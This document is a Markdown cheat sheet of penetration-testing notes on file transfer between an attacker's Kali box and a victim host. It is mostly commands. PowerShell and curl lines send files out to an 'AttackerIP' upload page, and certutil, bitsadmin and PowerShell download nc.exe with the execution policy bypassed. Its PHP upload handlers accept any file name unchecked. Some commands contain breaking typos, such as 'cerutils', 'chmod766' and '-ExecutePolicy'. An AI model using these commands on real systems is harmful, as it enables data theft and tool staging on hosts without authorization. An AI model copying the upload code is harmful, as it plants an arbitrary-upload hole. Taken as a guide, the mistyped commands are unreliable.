# File transfer

## Http

### Download

source: https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

#### Python

```
python -m http.server 8080
```

#### Apache

```
mv somefile /var/www/html
systemctl start apache2
```

### Upload

OffSec: https://github.com/ThomasBucaioni/pentools/blob/main/filetransfer/readme.md#uploads-to-kali

Other sources: 
- https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9
- https://davidhamann.de/2019/04/12/powershell-invoke-webrequest-by-example/
- https://stackoverflow.com/questions/22491129/how-to-send-multipart-form-data-with-powershell-invoke-restmethod

#### Php on Kali

Make a `upload.php` file in `/var/www/html/`:
```
vim /var/www/html/upload.php
```
as
```
<?php
  $target_dir = "uploads/";
  $target_file = $target_dir . basename($_FILES["targetfile"]["name"]);
  move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)
?>
```
then make a `upload.html` file in `/var/www/html/`:
```
vim /var/www/html/upload.html
```
as
```
<html>
<head></head>
    <body>
        <form action="upload.php" method="POST" enctype="multipart/form-data">
            <br><br>
            Choose a file:<br>
            <input type="file" name="targetfile"/><br>
            <input type="submit" name="submit" value="upload"/>
        </form>
    </body>
</html>
```
then make the `uploads` directory with write rights:
```
mkdir /var/www/html/uploads
chown www-data.www-data /var/www/html/uploads
chmod766 /var/www/html/uploads
```
and start the `apache2` service:
```
systemctl start apache2
```

#### On Windows

```
powershell -nop -exec bypass Invoke-RestMethod -Uri http://IpAtt/upload.php -Method Post -Infile 'c:\path\to\file.txt'
```
or
```
curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\path\to\file.txt" -X Post -v http://IpAtt/upload.php
```
or
```
$fieldName = 'targetfile' # name of the field in upload.php
$filePath = 'C:\full\path\to\file.txt' # full path...
$url = 'http://AttackerIpAddress/upload.php'

Add-Type -AssemblyName 'System.Net.Http'

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$fileStream = [System.IO.File]::OpenRead($filePath)
$fileName = [System.IO.Path]::GetFileName($filePath)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$content.Add($fileContent, $fieldName, $fileName)
$result = $client.PostAsync($url, $content).Result
```

#### Http on another Apache2 server

```
vim upload.html

<html>
  <head></head>
  <body>
    <form action="http://IpAtt/upload.php" method="POST" enctype="multipart/form-data">
      <br><br>
      Choose a file: <br>
      <input type="file" name="targetfile"><br>
      <input type="sumbit" name="submit" value="upload">
    </form>
  </body>
</html>
```
To upload on a browser at `http://AttackerIpAddress/upload.html`

## Other Linux tools

### Netcat `nc`

```
listener$ nc -lnvp 4444 > received.txt
sender$ nc $ListenerIp 4444 tosend.txt
```

### FTP

On the client:
```
ftp_client$ ftp $FtpServerIp
    Name: anonymous
    Password: 
    230 Login successful.
    ftp> 
```
FTP commands:
- `ls`
- `get somefile.txt`
- `put someotherfile.txt`
- `quit`
- `ascii`
- `binary`: https://knowledge.broadcom.com/external/article/28212/ftp-ascii-vs-binary-mode-what-it-means.html


## LolBas

Connection with `xfreerdp`:
```
xfreerdp +clipboard /u:myuser /p:mypass /v:VictimIP
```

### Cmd shell

#### Certutil

Simpler:
```
cerutils -urlcache -split -f http://AttackerApacheIP/nc.exe nc.exe
```

#### Bitsadmin

Longer:
```
bitsadmin /create MyDownload
bitsadmin /addfile MyDownload http://AttackerIP/nc.exe C:\Users\myuser\Downloads\nc.exe
bitsadmin /resume MyDownload
bitsadmin /info MyDownload /verbose
bitsadmin /complete MyDownload
```

### Powershell

#### WebClient API

Download script: `PS> type .\mywgetscript.ps1`
```
$webclient = New-Object System.Net.WebClient
$url = "http://$AttackerIP/nc.exe"
$file = "nc.exe"
$webclient.DownloadFile($url,$file)
```
and run it:
```
PS> powershell.exe -ExecutePolicy Bypass -Nologo -NonInteractive -NoProfile -File .\mywgetscript.ps1
```
or as a one-liner:
```
PS> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$AttackerIp/nc.exe', 'nc.exe')
```

#### WebRequest API

Native request:
```
PS> Invoke-WebRequest -URI http://$AttackerIP/nc.exe -OutFile nc.exe
```
or with the alias `wget`:
```
PS> wget http://$AttackerIp/nc.exe -o nc.exe
```

#### Uploads to Kali

On Kali, at `/var/www/html/uploadForWindows.php`:
```
<?php 
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
and in Powershell:
```
PS> powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'localfileonwindows.txt')
```

## File recovery

```
sudo foremost -v -q -t jpg -i /dev/sdaX -o ./myrecoverydir
```
